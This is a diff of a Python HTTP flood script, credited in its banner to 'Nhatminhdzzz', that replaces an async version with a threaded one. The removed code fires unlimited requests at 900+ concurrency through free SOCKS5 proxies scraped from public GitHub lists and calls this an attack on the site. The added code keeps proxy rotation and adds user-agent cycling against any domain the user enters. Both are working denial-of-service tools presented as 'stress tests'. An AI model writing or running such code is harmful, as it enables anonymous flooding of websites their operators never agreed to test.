@@ -1,29 +1,13 @@
-#!/usr/bin/env python3
-"""
-STRESS TEST ULTIMATE - Lấy Proxy Từ Nhiều Link
-"""
-
-import asyncio
-import aiohttp
-import aiohttp_socks
-import random
+import requests
+import concurrent.futures
 import time
+import random
+import logging
 import os
-import sys
-from datetime import datetime
+from itertools import cycle
 
-# ====================== CẤU HÌNH ======================
-PROXY_URLS = [
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt",
-    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
-    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
-    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
-]
-
-CONCURRENCY = 900
-MIN_DELAY = 0.01
-MAX_DELAY = 0.06
-# =====================================================
+MIN_DELAY = 0.1  # seconds
+MAX_DELAY = 1.0  # seconds
 
 def show_banner():
     os.system("cls" if os.name == "nt" else "clear")
@@ -34,7 +18,6 @@ def show_banner():
 ██╔═══╝░██║╚████║██║╚██╔╝██║
 ██║░░░░░██║░╚███║██║░╚═╝░██║
 ╚═╝░░░░░╚═╝░░╚══╝╚═╝░░░░░╚═╝
-
 ██████╗░██████╗░░█████╗░░██████╗
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝
 ██║░░██║██║░░██║██║░░██║╚█████╗░
@@ -43,96 +26,118 @@ def show_banner():
 ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
                                             By Nhatminhdzzz
     """
-    print("\033[96m" + banner + "\033[0m")
+    print(banner)
 
-async def load_proxies_from_url(url, session):
+def load_user_agents(filename="user-agent.txt"):
     try:
-        async with session.get(url, timeout=15) as resp:
-            if resp.status == 200:
-                text = await resp.text()
-                proxies = ['socks5://' + line.strip() for line in text.splitlines() 
-                          if line.strip() and not line.startswith('#')]
-                return proxies
-    except:
-        pass
-    return []
+        with open(filename, "r", encoding="utf-8") as f:
+            agents = [line.strip() for line in f if line.strip()]
+        if not agents:
+            raise ValueError("User-agent list is empty!")
+        return agents
+    except Exception as e:
+        print(f"Error loading user agents: {e}")
+        return ["Mozilla/5.0 (default UA)"]
 
-async def load_all_proxies():
-    print("\033[96m[*] Đang tải proxy từ nhiều nguồn...\033[0m")
-    all_proxies = []
-    
-    async with aiohttp.ClientSession() as session:
-        tasks = [load_proxies_from_url(url, session) for url in PROXY_URLS]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        for result in results:
-            if isinstance(result, list):
-                all_proxies.extend(result)
-    
-    # Loại trùng và lọc
-    unique_proxies = list(set(all_proxies))
-    print(f"\033[92m[+] Tổng proxy thu thập: {len(unique_proxies)}\033[0m")
-    return unique_proxies
+def load_proxies():
+    url = "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/all/data.txt"
+    try:
+        print("Đang tải danh sách proxy...")
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            proxies = [line.strip() for line in response.text.splitlines() if line.strip()]
+            print(f"✅ Tải thành công {len(proxies)} proxy")
+            return proxies
+        else:
+            print(f"❌ Lỗi khi tải proxy: {response.status_code}")
+            return []
+    except Exception as e:
+        print(f"❌ Không thể tải proxy: {e}")
+        return []
 
-async def send_request(session, url, req_id, proxy):
+def send_request(url, req_id, ua_cycle, proxy_list=None):
     delay = random.uniform(MIN_DELAY, MAX_DELAY)
-    await asyncio.sleep(delay)
+    time.sleep(delay)
+    
+    headers = {"User-Agent": next(ua_cycle)}
+    
+    proxies = None
+    if proxy_list and len(proxy_list) > 0:
+        proxy = random.choice(proxy_list)
+        proxies = {"http": proxy, "https": proxy}
+    
+    start = time.time()
+    try:
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
+        elapsed = time.time() - start
+        
+        if response.status_code == 200:
+            msg = (f"[Request {req_id}] ✅ Success ({response.status_code}) | "
+                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent'][:50]}...")
+        elif response.status_code == 403:
+            msg = (f"[Request {req_id}] 🚫 Forbidden (403) | "
+                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s")
+        else:
+            msg = (f"[Request {req_id}] ⚠️ Failed ({response.status_code}) | "
+                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s")
+        
+        print(msg)
+        logging.info(msg)
+        return response.status_code
+    except Exception as e:
+        elapsed = time.time() - start
+        msg = f"[Request {req_id}] ❌ Error: {e} | Delay: {delay:.3f}s | RT: {elapsed:.3f}s"
+        print(msg)
+        logging.error(msg)
+        return None
 
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+def main():
+    show_banner()
+    domain = input("Enter website domain (e.g. https://example.com): ").strip()
     
     try:
-        async with session.get(url, headers=headers, proxy=proxy, timeout=10) as resp:
-            await resp.read()
-            print(f"\033[92m[{req_id:6d}] ✅ {resp.status}\033[0m")
-            return 1
-    except:
-        print(f"\033[91m[{req_id:6d}] ❌ ERROR\033[0m")
-        return 0
-
-async def main():
-    show_banner()
-
-    url = input("\033[96mNhập URL website: \033[0m").strip()
-    if not url.startswith("http"):
-        url = "https://" + url
-
-    total = int(input("\033[96mTổng request (0 = vô hạn): \033[0m") or "0")
-    concurrency = int(input("\033[96mConcurrency (khuyến nghị 800-1200): \033[0m") or "900")
-
-    proxies = await load_all_proxies()
-    if not proxies:
-        print("\033[91mKhông có proxy nào!\033[0m")
+        total_requests = int(input("Enter number of requests: "))
+        workers = int(input("Enter number of workers (parallel threads): "))
+    except ValueError:
+        print("❌ Invalid input! Please enter integers for requests and workers.")
         return
 
-    print(f"\n\033[95m🚀 BẮT ĐẦU TẤN CÔNG {url} | Concurrency: {concurrency}\033[0m\n")
+    if total_requests <= 0 or workers <= 0:
+        print("❌ Requests and workers must be positive integers!")
+        return
+
+    # Tải proxy
+    use_proxy = input("Sử dụng proxy từ link? (y/n): ").strip().lower()
+    proxy_list = load_proxies() if use_proxy == 'y' else []
+
+    logging.basicConfig(filename="load_test.log", level=logging.INFO,
+                        format="%(asctime)s - %(levelname)s - %(message)s")
+
+    user_agents = load_user_agents("user-agent.txt")
+    ua_cycle = cycle(user_agents)
+
+    print(f"\nStarting load test on {domain} with {total_requests} requests using {workers} workers...")
+    if proxy_list:
+        print(f"Using {len(proxy_list)} proxies from GitHub")
+    print(f"Random delay per request: {MIN_DELAY}–{MAX_DELAY} seconds\n")
 
     start_time = time.time()
-    success = 0
-    connector = aiohttp_socks.ProxyConnector.from_url(random.choice(proxies))
+    results = []
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = [executor.submit(send_request, domain, i+1, ua_cycle, proxy_list) 
+                  for i in range(total_requests)]
+        for future in concurrent.futures.as_completed(futures):
+            results.append(future.result())
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
-        i = 0
-
-        while (total == 0 or i < total):
-            i += 1
-            task = asyncio.create_task(send_request(session, url, i, random.choice(proxies)))
-            tasks.append(task)
-
-            if len(tasks) >= concurrency:
-                done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-                success += sum(1 for t in done if t.result() == 1)
-                tasks = [t for t in tasks if not t.done()]
-
-    duration = time.time() - start_time
-    print("\n" + "="*70)
-    print("                    KẾT QUẢ")
-    print("="*70)
-    print(f"Tổng request : {i}")
-    print(f"Thành công   : {success}")
-    print(f"Thời gian    : {duration:.2f} giây")
-    print(f"Tốc độ       : {i/duration:.2f} req/s")
-    print("="*70)
+    end_time = time.time()
+    print("\n--- Load Test Summary ---")
+    print(f"Total requests sent: {len(results)}")
+    print(f"Successful responses: {results.count(200)}")
+    print(f"403 Forbidden responses: {results.count(403)}")
+    print(f"Other errors: {len([r for r in results if r not in (200, 403) and r is not None])}")
+    print(f"Total time: {end_time - start_time:.2f} seconds")
+    print("Logs saved to: load_test.log")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
